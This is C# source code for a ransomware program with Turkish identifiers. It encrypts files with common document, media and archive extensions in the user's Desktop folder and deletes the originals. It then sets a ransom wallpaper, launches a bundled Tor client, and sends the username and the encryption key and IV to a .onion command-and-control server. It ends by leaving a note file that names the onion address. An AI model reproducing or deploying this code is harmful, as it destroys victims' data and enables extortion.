using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using Ransomware.SistemFonk;
using Ransomware.Webİşlev.SOCKS;

namespace Ransomware
{
    class Program
    {
        static string[] dosyalar = new string[]
        {
            "libcrypto-1_1.dll",
            "libevent-2-1-7.dll",
            "libevent_core-2-1-7.dll",
            "libevent_extra-2-1-7.dll",
            "libgcc_s_sjlj-1.dll",
            "libssl-1_1.dll",
            "libssp-0.dll",
            "libwinpthread-1.dll",
            "zlib1.dll",
            "tor.exe",
            "wallpaper.jpg"
        };

        static string[] uzantilar = new string[]
        {
            ".txt",
            ".xls",
            ".xlsx",
            ".ppt",
            ".pptx",
            ".mdb",
            ".mdbx",
            ".avi",
            ".mp3",
            ".mp4",
            ".mkv",
            ".mkv",
            ".wmv",
            ".flv",
            ".3gp",
            ".dat",
            ".mov",
            ".ogg",
            ".wav",
            ".mid",
            ".jpeg",
            ".jpg",
            ".bmp",
            ".psd",
            ".gif",
            ".pdf",
            ".rar",
            ".zip",
            ".tar",
            ".7z",
            ".odt",
            ".ott",
            ".rtf",
            ".uot",
            ".dic"
        };

        static void TorDosyalariCikart(string yol)
        {
            Directory.CreateDirectory(yol + "\\Tor");

            Assembly assembly = Assembly.GetExecutingAssembly();
            string _namespace = assembly.GetName().Name;

            foreach (string dosya in dosyalar)
            {
                Stream resource = assembly.GetManifestResourceStream(_namespace + "." + dosya);
                FileStream dosyaStream = new FileStream(yol + "\\Tor\\" + dosya, FileMode.Create, FileAccess.Write);
                resource.CopyTo(dosyaStream);

                resource.Close();
                dosyaStream.Close();
            }
        }

        static IEnumerable<string> DosyalariCikart(string yol)
        {
            string[] dosyalar = Directory.GetFiles(yol);
            string[] klasorler = Directory.GetDirectories(yol);

            foreach (string dosya in dosyalar)
                yield return dosya;

            foreach (string klasor in klasorler)
                foreach (string dosya in DosyalariCikart(klasor))
                    yield return dosya;
        }

        static Dictionary<string, string> KeyOlustur(string kombinasyon)
        {
            Random rndm = new Random();
            string key = new string(Enumerable.Repeat(kombinasyon, 16).Select(s => s[rndm.Next(s.Length)]).ToArray());
            string iv = new string(Enumerable.Repeat(kombinasyon, 16).Select(s => s[rndm.Next(s.Length)]).ToArray());

            return new Dictionary<string, string>()
            {
                { "key", key },
                { "iv", iv }
            };
        }

        static Socket TorBaglan(string hiddenservice, short hiddenservice_port)
        {
            ISOCKS socks5 = new SOCKS5("127.0.0.1", 9050);
            Socket tor = socks5.SOCKSBaglan(hiddenservice, hiddenservice_port);

            return tor;
        }

        static void Main(string[] args)
        {
            Dictionary<string, string> keyiv = KeyOlustur("ABCDEFGHJIJKLMNOPRSTUVYZabcdefghijklmnoprstuvyz0123456789");
            DosyaSifreleyici dosyaSifreleyici = new DosyaSifreleyici(keyiv["key"], Encoding.Default.GetBytes(keyiv["iv"]));

            API.EkranDurumu(true);

            string fotografYol = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Tor\\wallpaper.jpg";

            API.ArkaplanDegistir(fotografYol);


            foreach (string yol in new string[] { Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) })
                foreach (string dosya in DosyalariCikart(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
                    if (uzantilar.Contains(Path.GetExtension(dosya)))
                    {
                        try
                        {
                            dosyaSifreleyici.Sifrele(dosya, ".weed");
                            File.Delete(dosya);
                        }
                        catch { }
                    }

            TorDosyalariCikart(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Tor\\tor.exe");

            string domain = "fyxfedr2nb2y4jktcusu5p6yjlgex2uibr3napu6jb5rmn6mbxkzyxqd.onion";

            Socket cnc_server = TorBaglan(domain, 80);

            string post_data = $"pc_ismi={Environment.UserName}&_key={keyiv["key"]}&iv={keyiv["iv"]}";

            string data = "POST /log.php HTTP/1.1";
            data += "\r\n";
            data += "User-Agent: Mozilla/5.0";
            data += "\r\n";
            data += "Host: 73s6inpk5qkmi3ta3kgmoimjetwkzrtv6zpww2xrxideg5xmbpnigqad.onion";
            data += "\r\n";
            data += "Content-Type: application/x-www-form-urlencoded";
            data += "\r\n";
            data += "Content-Length: " + post_data.Length.ToString();
            data += "\r\n\r\n";
            data += post_data;

            cnc_server.Send(Encoding.Default.GetBytes(data));
            byte[] buffer = new byte[4096];
            cnc_server.Receive(buffer);

            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Oku.txt", domain);
        }
    }
}
